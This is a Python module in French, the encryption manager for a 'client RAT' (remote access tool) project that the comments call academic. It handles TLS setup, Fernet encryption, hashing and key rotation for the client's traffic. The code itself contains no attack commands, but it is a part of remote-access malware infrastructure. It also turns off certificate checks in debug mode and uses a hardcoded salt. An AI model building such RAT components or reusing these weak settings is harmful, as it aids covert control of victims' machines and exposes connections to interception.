"""
Crypto Manager - Gestionnaire de chiffrement pour le client RAT
Gestion SSL/TLS et chiffrement des communications
"""

import ssl
import socket
import hashlib
import base64
import os
from typing import Optional, Dict, Any, Tuple
import logging

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

from client.utils.config import ClientConfig
from shared.exceptions import SecurityException

logger = logging.getLogger(__name__)

class CryptoManager:
    """Gestionnaire de chiffrement pour le client"""
    
    def __init__(self, config: ClientConfig):
        self.config = config
        self.ssl_context = None
        self.encryption_key = None
        self.fernet = None
        
        # Configuration SSL si activé
        if config.USE_SSL:
            self._setup_ssl_context()
        
        # Configuration du chiffrement symétrique si spécifié
        if config.ENCRYPTION_KEY:
            self._setup_symmetric_encryption()
        
        logger.info("CryptoManager initialisé")
    
    def _setup_ssl_context(self):
        """Configure le contexte SSL pour le client"""
        try:
            self.ssl_context = ssl.create_default_context()
            
            # Configuration pour environnement de test/académique
            if self.config.DEBUG:
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE
                logger.debug("SSL configuré en mode test (vérification désactivée)")
            else:
                # Configuration sécurisée pour production
                self.ssl_context.verify_mode = ssl.CERT_REQUIRED
                self.ssl_context.check_hostname = True
            
            # Chargement du certificat CA si fourni
            if self.config.SSL_CERT_FILE and os.path.exists(self.config.SSL_CERT_FILE):
                self.ssl_context.load_verify_locations(self.config.SSL_CERT_FILE)
                logger.debug(f"Certificat CA chargé: {self.config.SSL_CERT_FILE}")
            
            # Configuration des ciphers sécurisés
            self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
            
            # Configuration des protocoles
            self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
            
            logger.debug("Contexte SSL configuré avec succès")
            
        except Exception as e:
            logger.error(f"Erreur configuration SSL: {e}")
            raise SecurityException(f"Impossible de configurer SSL: {e}")
    
    def _setup_symmetric_encryption(self):
        """Configure le chiffrement symétrique"""
        try:
            if not CRYPTOGRAPHY_AVAILABLE:
                logger.warning("Cryptography non disponible - chiffrement symétrique désactivé")
                return
            
            # Utilisation de la clé fournie ou génération d'une nouvelle
            if self.config.ENCRYPTION_KEY:
                # Si c'est une chaîne, la convertir en bytes
                if isinstance(self.config.ENCRYPTION_KEY, str):
                    key_bytes = self.config.ENCRYPTION_KEY.encode('utf-8')
                else:
                    key_bytes = self.config.ENCRYPTION_KEY
                
                # Dérivation de la clé pour Fernet (32 bytes)
                self.encryption_key = self._derive_key(key_bytes)
            else:
                # Génération d'une clé aléatoire
                self.encryption_key = Fernet.generate_key()
            
            # Initialisation de Fernet
            self.fernet = Fernet(self.encryption_key)
            
            logger.debug("Chiffrement symétrique configuré")
            
        except Exception as e:
            logger.error(f"Erreur configuration chiffrement: {e}")
            raise SecurityException(f"Impossible de configurer le chiffrement: {e}")
    
    def _derive_key(self, password: bytes, salt: bytes = None) -> bytes:
        """
        Dérive une clé à partir d'un mot de passe
        
        Args:
            password: Mot de passe en bytes
            salt: Sel pour la dérivation (optionnel)
        
        Returns:
            bytes: Clé dérivée pour Fernet
        """
        if not salt:
            # Utilisation d'un sel fixe pour la reproductibilité
            # En production, utiliser un sel aléatoire et le stocker
            salt = b'rat_project_salt_2025'
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # Fernet nécessite une clé de 32 bytes
            salt=salt,
            iterations=100000,  # Nombre d'itérations suffisant
        )
        
        return base64.urlsafe_b64encode(kdf.derive(password))
    
    def wrap_socket(self, sock: socket.socket, server_hostname: str = None) -> socket.socket:
        """
        Enveloppe un socket avec SSL
        
        Args:
            sock: Socket à envelopper
            server_hostname: Nom du serveur pour la vérification
        
        Returns:
            socket.socket: Socket SSLSocket
        """
        try:
            if not self.ssl_context:
                raise SecurityException("Contexte SSL non configuré")
            
            # Utilisation du hostname de configuration si non fourni
            if not server_hostname:
                server_hostname = self.config.SERVER_HOST
            
            # Enveloppement SSL
            ssl_socket = self.ssl_context.wrap_socket(
                sock,
                server_hostname=server_hostname if not self.config.DEBUG else None
            )
            
            logger.debug(f"Socket SSL créé pour {server_hostname}")
            return ssl_socket
            
        except Exception as e:
            logger.error(f"Erreur enveloppement SSL: {e}")
            raise SecurityException(f"Impossible de créer la connexion SSL: {e}")
    
    def encrypt_data(self, data: bytes) -> bytes:
        """
        Chiffre des données avec le chiffrement symétrique
        
        Args:
            data: Données à chiffrer
        
        Returns:
            bytes: Données chiffrées
        """
        try:
            if not self.fernet:
                logger.warning("Chiffrement symétrique non configuré")
                return data
            
            encrypted_data = self.fernet.encrypt(data)
            logger.debug(f"Données chiffrées: {len(data)} -> {len(encrypted_data)} bytes")
            
            return encrypted_data
            
        except Exception as e:
            logger.error(f"Erreur chiffrement: {e}")
            raise SecurityException(f"Impossible de chiffrer les données: {e}")
    
    def decrypt_data(self, encrypted_data: bytes) -> bytes:
        """
        Déchiffre des données avec le chiffrement symétrique
        
        Args:
            encrypted_data: Données chiffrées
        
        Returns:
            bytes: Données déchiffrées
        """
        try:
            if not self.fernet:
                logger.warning("Chiffrement symétrique non configuré")
                return encrypted_data
            
            decrypted_data = self.fernet.decrypt(encrypted_data)
            logger.debug(f"Données déchiffrées: {len(encrypted_data)} -> {len(decrypted_data)} bytes")
            
            return decrypted_data
            
        except Exception as e:
            logger.error(f"Erreur déchiffrement: {e}")
            raise SecurityException(f"Impossible de déchiffrer les données: {e}")
    
    def encrypt_string(self, text: str) -> str:
        """
        Chiffre une chaîne de caractères
        
        Args:
            text: Texte à chiffrer
        
        Returns:
            str: Texte chiffré encodé en base64
        """
        try:
            text_bytes = text.encode('utf-8')
            encrypted_bytes = self.encrypt_data(text_bytes)
            return base64.b64encode(encrypted_bytes).decode('ascii')
            
        except Exception as e:
            logger.error(f"Erreur chiffrement string: {e}")
            raise SecurityException(f"Impossible de chiffrer le texte: {e}")
    
    def decrypt_string(self, encrypted_text: str) -> str:
        """
        Déchiffre une chaîne de caractères
        
        Args:
            encrypted_text: Texte chiffré en base64
        
        Returns:
            str: Texte déchiffré
        """
        try:
            encrypted_bytes = base64.b64decode(encrypted_text.encode('ascii'))
            decrypted_bytes = self.decrypt_data(encrypted_bytes)
            return decrypted_bytes.decode('utf-8')
            
        except Exception as e:
            logger.error(f"Erreur déchiffrement string: {e}")
            raise SecurityException(f"Impossible de déchiffrer le texte: {e}")
    
    def hash_data(self, data: bytes, algorithm: str = 'sha256') -> str:
        """
        Calcule le hash de données
        
        Args:
            data: Données à hasher
            algorithm: Algorithme de hash ('sha256', 'sha1', 'md5')
        
        Returns:
            str: Hash en hexadécimal
        """
        try:
            if algorithm == 'sha256':
                hasher = hashlib.sha256()
            elif algorithm == 'sha1':
                hasher = hashlib.sha1()
            elif algorithm == 'md5':
                hasher = hashlib.md5()
            else:
                raise ValueError(f"Algorithme de hash non supporté: {algorithm}")
            
            hasher.update(data)
            return hasher.hexdigest()
            
        except Exception as e:
            logger.error(f"Erreur calcul hash: {e}")
            raise SecurityException(f"Impossible de calculer le hash: {e}")
    
    def verify_hash(self, data: bytes, expected_hash: str, algorithm: str = 'sha256') -> bool:
        """
        Vérifie l'intégrité de données avec un hash
        
        Args:
            data: Données à vérifier
            expected_hash: Hash attendu
            algorithm: Algorithme de hash utilisé
        
        Returns:
            bool: True si le hash correspond
        """
        try:
            actual_hash = self.hash_data(data, algorithm)
            return actual_hash.lower() == expected_hash.lower()
            
        except Exception as e:
            logger.error(f"Erreur vérification hash: {e}")
            return False
    
    def generate_random_key(self, length: int = 32) -> bytes:
        """
        Génère une clé aléatoire sécurisée
        
        Args:
            length: Longueur de la clé en bytes
        
        Returns:
            bytes: Clé aléatoire
        """
        try:
            return os.urandom(length)
        except Exception as e:
            logger.error(f"Erreur génération clé: {e}")
            raise SecurityException(f"Impossible de générer une clé aléatoire: {e}")
    
    def get_ssl_info(self) -> Dict[str, Any]:
        """
        Récupère les informations SSL
        
        Returns:
            Dict: Informations de configuration SSL
        """
        try:
            info = {
                'ssl_enabled': self.config.USE_SSL,
                'ssl_context_configured': self.ssl_context is not None,
                'debug_mode': self.config.DEBUG,
                'cert_file': self.config.SSL_CERT_FILE,
                'verify_cert': getattr(self.config, 'SSL_VERIFY_CERT', True)
            }
            
            if self.ssl_context:
                info.update({
                    'minimum_version': str(self.ssl_context.minimum_version),
                    'verify_mode': str(self.ssl_context.verify_mode),
                    'check_hostname': self.ssl_context.check_hostname
                })
            
            return info
            
        except Exception as e:
            logger.error(f"Erreur récupération info SSL: {e}")
            return {'error': str(e)}
    
    def get_encryption_info(self) -> Dict[str, Any]:
        """
        Récupère les informations de chiffrement
        
        Returns:
            Dict: Informations de chiffrement
        """
        try:
            return {
                'symmetric_encryption_enabled': self.fernet is not None,
                'cryptography_available': CRYPTOGRAPHY_AVAILABLE,
                'encryption_key_configured': self.encryption_key is not None,
                'encryption_key_length': len(self.encryption_key) if self.encryption_key else 0
            }
            
        except Exception as e:
            logger.error(f"Erreur récupération info chiffrement: {e}")
            return {'error': str(e)}
    
    def test_ssl_connection(self, host: str, port: int, timeout: int = 10) -> Dict[str, Any]:
        """
        Teste une connexion SSL vers un serveur
        
        Args:
            host: Nom d'hôte
            port: Port
            timeout: Timeout de connexion
        
        Returns:
            Dict: Résultat du test
        """
        try:
            if not self.ssl_context:
                return {
                    'success': False,
                    'error': 'Contexte SSL non configuré'
                }
            
            # Création du socket de test
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            try:
                # Connexion TCP
                sock.connect((host, port))
                
                # Enveloppement SSL
                ssl_sock = self.ssl_context.wrap_socket(
                    sock,
                    server_hostname=host if not self.config.DEBUG else None
                )
                
                # Récupération des informations du certificat
                cert_info = ssl_sock.getpeercert()
                cipher_info = ssl_sock.cipher()
                
                ssl_sock.close()
                
                return {
                    'success': True,
                    'certificate': cert_info,
                    'cipher': cipher_info,
                    'ssl_version': ssl_sock.version()
                }
                
            except Exception as e:
                sock.close()
                return {
                    'success': False,
                    'error': str(e)
                }
                
        except Exception as e:
            logger.error(f"Erreur test SSL: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def secure_delete_key(self):
        """Suppression sécurisée de la clé de chiffrement"""
        try:
            if self.encryption_key:
                # Écrasement de la clé en mémoire
                key_length = len(self.encryption_key)
                self.encryption_key = os.urandom(key_length)
                self.encryption_key = None
            
            if self.fernet:
                self.fernet = None
            
            logger.debug("Clé de chiffrement supprimée de manière sécurisée")
            
        except Exception as e:
            logger.error(f"Erreur suppression sécurisée: {e}")
    
    def rotate_encryption_key(self, new_password: str = None) -> bool:
        """
        Effectue une rotation de la clé de chiffrement
        
        Args:
            new_password: Nouveau mot de passe (optionnel)
        
        Returns:
            bool: True si la rotation a réussi
        """
        try:
            if not CRYPTOGRAPHY_AVAILABLE:
                logger.warning("Rotation de clé impossible - cryptography non disponible")
                return False
            
            # Sauvegarde de l'ancienne clé pour migration éventuelle
            old_fernet = self.fernet
            
            # Génération de la nouvelle clé
            if new_password:
                key_bytes = new_password.encode('utf-8')
                self.encryption_key = self._derive_key(key_bytes)
            else:
                self.encryption_key = Fernet.generate_key()
            
            # Initialisation du nouveau Fernet
            self.fernet = Fernet(self.encryption_key)
            
            logger.info("Rotation de clé effectuée avec succès")
            return True
            
        except Exception as e:
            logger.error(f"Erreur rotation clé: {e}")
            # Restauration de l'ancienne clé en cas d'erreur
            if 'old_fernet' in locals():
                self.fernet = old_fernet
            return False
    
    def cleanup(self):
        """Nettoyage des ressources cryptographiques"""
        try:
            # Suppression sécurisée de la clé
            self.secure_delete_key()
            
            # Nettoyage du contexte SSL
            if self.ssl_context:
                self.ssl_context = None
            
            logger.debug("Nettoyage cryptographique effectué")
            
        except Exception as e:
            logger.error(f"Erreur nettoyage crypto: {e}")
    
    def __del__(self):
        """Destructeur - nettoyage automatique"""
        try:
            self.cleanup()
        except:
            pass  # Ignorer les erreurs dans le destructeur